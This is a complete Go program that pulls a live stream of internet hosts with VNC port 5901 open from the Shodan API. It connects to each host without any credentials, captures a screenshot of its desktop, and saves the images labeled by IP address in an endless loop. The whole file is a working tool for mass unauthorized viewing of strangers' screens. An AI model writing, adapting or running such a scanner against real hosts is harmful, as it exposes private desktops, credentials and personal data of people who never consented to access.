package main

import (
	"context"
	"flag"
	"fmt"
	"github.com/mitchellh/go-vnc"
	"gopkg.in/ns3777k/go-shodan.v3/shodan"
	"image"
	"image/color"
	"image/png"
	"log"
	"net"
	"os"
	"path"
	"time"
)

func screenCapture(host string, port int, filename string) (err error) {
	address := fmt.Sprintf("%s:%d", host, port)
	nc, err := net.Dial("tcp", address)
	if err != nil {
		return err
	}
	defer nc.Close()

	ch := make(chan vnc.ServerMessage)

	c, err := vnc.Client(nc, &vnc.ClientConfig{
		Exclusive:       false,
		ServerMessageCh: ch,
		ServerMessages:  []vnc.ServerMessage{new(vnc.FramebufferUpdateMessage)},
	})
	if err != nil {
		return err
	}
	defer c.Close()

	err = c.FramebufferUpdateRequest(false, 0, 0, c.FrameBufferWidth, c.FrameBufferHeight)

	if err != nil {
		return err
	}

	msg := <-ch

	rects := msg.(*vnc.FramebufferUpdateMessage).Rectangles
	fmt.Println()

	w := int(rects[0].Width)
	h := int(rects[0].Height)
	img := image.NewRGBA(image.Rect(0, 0, w, h))

	enc := rects[0].Enc.(*vnc.RawEncoding)
	i := 0
	x := 0
	y := 0
	for _, v := range enc.Colors {
		x = i % w
		y = i / w
		r := uint8(v.R)
		g := uint8(v.G)
		b := uint8(v.B)

		img.Set(x, y, color.RGBA{r, g, b, 255})
		i++
	}

	// Save to out.png
	f, _ := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE, 0600)
	defer f.Close()
	png.Encode(f, img)
	return nil
}

func main() {
	dumpdir := flag.String("dumpdir", "/tmp/vncdumps", "screenshots will be dumped to this directory")
	logfile := flag.String("logfile", "slideshow.log", "logfile location")
	flag.Parse()

	f, err := os.OpenFile(*logfile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("error opening logfile: %v", err)
	}
	defer f.Close()
	log.SetOutput(f)

	client := shodan.NewEnvClient(nil)

	ports := []int{5901}
	chBanner := make(chan *shodan.HostData)
	err = client.GetBannersByPorts(context.Background(), ports, chBanner)

	if err != nil {
		log.Panic(err)
	}

	if _, err = os.Stat(*dumpdir); os.IsNotExist(err) {
		err = os.Mkdir(*dumpdir, 0755)
	}
	if err != nil {
		log.Panic(err)
	}

	for {
		banner, ok := <-chBanner
		if !ok {
			log.Fatalln("channel closed")
		}
		ip := banner.IP.String()
		imgname := fmt.Sprintf("%d_%s.png", time.Now().UnixNano(), ip)
		filepath := path.Join(*dumpdir, imgname)
		err = screenCapture(ip, 5901, filepath)
		if err != nil {
			log.Printf("ERROR: %s %v", ip, err)
			continue
		}
		log.Printf("INFO: dumped VNC screenshot from host %s to %s", ip, filepath)
	}
}
